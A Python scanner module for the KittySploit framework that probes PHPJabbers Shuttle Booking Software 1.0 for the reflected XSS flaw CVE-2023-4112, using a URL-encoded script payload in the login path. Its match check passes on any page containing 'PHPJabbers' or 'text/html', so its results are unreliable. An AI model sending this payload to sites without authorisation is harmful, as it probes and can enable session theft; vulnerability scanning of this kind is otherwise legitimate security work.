#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Shuttle Booking Software 1.0 - Cross Site Scripting Detection',
        'description': "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'xss', 'unauth', 'phpjabbers', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploitalert.com/view-details.html?id=39750',
            'https://cxsecurity.com/ascii/WLB-2023080012',
            'http://packetstormsecurity.com/files/173930/PHPJabbers-Shuttle-Booking-Software-1.0-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4112',
            'https://vuldb.com/?ctiid.235959',
        ],
        'cve': 'CVE-2023-4112',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php/gm5rj%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ebwude?controller=pjAdmin&action=pjActionLogin&err=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('PHPJabbers', '><script>alert(document.domain)</script>', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="PHPJabbers Shuttle Booking Software 1.0 - Cross Site Scripting detected",
                path='/index.php/gm5rj%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ebwude?controller=pjAdmin&action=pjActionLogin&err=1',
            )
            return True
        return False

